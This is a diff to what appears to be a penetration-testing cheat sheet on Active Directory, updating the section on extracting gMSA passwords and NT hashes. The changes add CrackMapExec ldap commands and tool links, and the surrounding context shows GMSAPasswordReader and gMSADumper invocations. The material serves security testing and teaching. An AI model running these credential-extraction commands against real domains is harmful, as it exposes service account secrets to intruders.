@@ -1606,15 +1606,20 @@ Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -
 
 ### Extract NT hash from the Active Directory
 
-* [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#)
+* [mpgn/CrackMapExec](https://github.com/mpgn/CrackMapExec)
   ```ps1
-  # https://github.com/rvazarkar/GMSAPasswordReader
+  # Use --lsa to get GMSA ID
+  crackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
+  crackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
+  ```
+
+* [rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
+  ```ps1
   GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
   ```
 
-* [gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)
+* [micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
    ```powershell
-  # https://github.com/micahvandeusen/gMSADumper
   python3 gMSADumper.py -u User -p Password1 -d domain.local
   ```
   
@@ -1626,7 +1631,7 @@ Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -
   $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
   ```
 
-* [gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
+* [kdejoyce/gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
 
 
 ## Forging Golden GMSA
